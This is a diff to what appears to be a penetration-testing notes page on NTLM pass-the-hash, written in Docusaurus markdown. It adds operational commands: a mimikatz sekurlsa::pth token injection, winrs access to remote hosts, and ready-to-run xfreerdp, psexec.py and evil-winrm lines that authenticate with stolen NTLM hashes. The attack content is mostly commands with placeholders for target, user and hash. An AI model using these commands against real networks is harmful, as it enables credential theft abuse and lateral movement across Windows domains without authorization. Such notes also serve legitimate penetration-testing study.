@@ -6,6 +6,10 @@ title: Pass The Hash
 
 :::
 
+import Tabs from '@theme/Tabs';
+import TabItem from '@theme/TabItem';
+
+
 The **`NTLM`** **Challenge** sent during Authentication can be responded to just by knowing the **Password Hash.** This means we can Authenticate without requiring the plaintext password to be known. 
 
 Instead of having to crack **NTLM Hashes**, if the Windows Domain is configured to use NTLM Authentication, we can **`Pass-the-Hash` (PtH)** and Authenticate Successfully.
@@ -44,6 +48,8 @@ sekurlsa::msv
 
 We can use the **`Extracted Hashes`** to perform a **Pass-the-Hash** Attack by using **`mimikatz`** to Inject an Access Token for the Victim User on a **Reverse Shell or any other Command.**
 
+If we run the **`whoami`** Command on this Shell, it will still show us the Original User before doing **PtH**, but any Command run from here will actually use the **Credentials Injected** using **PtH**.
+
 ```batch
 :: Reverts the Previous Token
 token::revert
@@ -55,8 +61,52 @@ sekurlsa::pth /user:USER /domain:TARGET /ntlm:HASH /run:"Command/PAYLOAD To Run"
 /run:"cmd.exe"
 ```
 
+<br/>
+
+Once we have a **Command Prompt** with the Credentials Loaded we can use `winrs` to connect to another **TARGET** on the Domain since the Credentials are **Injected** into our Session.
+
 ```batch
-:: It is also Possible to use [PSExec]
-:: [Domain] Can be Removed
-psexec.py -hashes ":HASH" DOMAIN/USER@TARGET
+:: The [Username - Password] Fields are not Necessary because the Credentials are already Injected
+winrs.exe -r:TARGET cmd
 ```
+
+
+<br/>
+
+### Other Ways of Connecting
+
+We can use these **Tools** to connect to the **Target.**
+
+- <a class="button button--outline button--info" href="https://github.com/Hackplayers/evil-winrm">Evil-WinRM</a> <a class="button button--outline button--info" href="https://github.com/SecureAuthCorp/impacket">PsExec</a>
+
+<Tabs>
+  <TabItem value="one" label="Remote Desktop"> 
+    <p>
+
+```batch
+xfreerdp /v:TARGET /u:DOMAIN\\USERNAME /pth:NTLM_HASH
+```
+
+</p>
+  </TabItem>
+  <TabItem value="two" label="PsExec">
+    <p>
+
+```batch
+psexec.py -hashes ":NTLM_HASH" DOMAIN/USER@TARGET
+```
+
+</p>
+  </TabItem>
+    <TabItem value="three" label="Evil-WinRM">
+    <p>
+
+```batch
+evil-winrm -i TARGET -u USERNAME -H NTLM_HASH
+```
+
+</p>
+  </TabItem>
+
+  
+</Tabs>
